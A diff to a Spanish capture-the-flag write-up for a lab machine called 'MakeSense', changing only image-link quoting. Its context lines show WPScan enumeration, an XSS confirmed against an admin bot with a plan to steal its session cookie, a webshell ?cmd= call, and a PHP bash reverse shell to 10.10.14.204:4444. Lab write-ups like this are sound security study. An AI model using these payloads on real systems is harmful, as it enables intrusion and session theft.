@@ -39,7 +39,7 @@ Además, el escaneo nos revela un dato crucial: el certificado SSL expone el dom
 
 ## Enumeracion de la superficie WEB
 
-![Resultados de WPScan](../../Images/MakeSense/Pasted%20image%2020260924213242.png)
+![Resultados de WPScan]('../../Images/MakeSense/Pasted%20image%2020260924213242.png')
 
 ```bash
 wpscan --url https://makesense.htb --disable-tls-checks -e u,ap,at --plugins-detection aggressive
@@ -138,7 +138,7 @@ action=submit_contact_form&nonce=1fd576de28&name=dsds&email=dsdsd%40gmail.com&ph
 
 ```
 
-![Petición recibida desde el bot administrador](../../Images/MakeSense/Pasted%20image%2020260924221945.png) El primer payload funcionó perfectamente. El bot del administrador está activo y está revisando los mensajes de manera programada cada minuto (visto en los accesos de las `23:04:29` y `23:05:30`). El código `404` en el servidor Python es completamente normal porque el archivo `/xss_work` no existe, pero lo importante es que se ha demostrado la ejecución de código remoto (XSS) en el navegador de la víctima.
+![Petición recibida desde el bot administrador]('../../Images/MakeSense/Pasted%20image%2020260924221945.png') El primer payload funcionó perfectamente. El bot del administrador está activo y está revisando los mensajes de manera programada cada minuto (visto en los accesos de las `23:04:29` y `23:05:30`). El código `404` en el servidor Python es completamente normal porque el archivo `/xss_work` no existe, pero lo importante es que se ha demostrado la ejecución de código remoto (XSS) en el navegador de la víctima.
 
 Ahora que confirmamos que el bot procesa el JavaScript, el siguiente paso es **robar su cookie de sesión** para suplantarlo y entrar al panel de administración de WordPress (`/wp-admin`).
 
@@ -731,7 +731,7 @@ Luego accedes a:
 https://makesense.htb/wp-content/themes/webagency/404.php?cmd=id
 ```
 
-![Respuesta del endpoint vulnerable](../../Images/MakeSense/Pasted%20image%2020260925153305.png)
+![Respuesta del endpoint vulnerable]('../../Images/MakeSense/Pasted%20image%2020260925153305.png')
 
 ```php
 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.204/4444 0>&1' &"); ?>
@@ -1304,7 +1304,7 @@ export TERM=xterm
 stty rows 50 columns 200
 ```
 
-![Shell root en MakeSense](../../Images/MakeSense/Pasted%20image%2020260925165637.png)
+![Shell root en MakeSense]('../../Images/MakeSense/Pasted%20image%2020260925165637.png')
 ---
 
 ## Resumen de la cadena completa
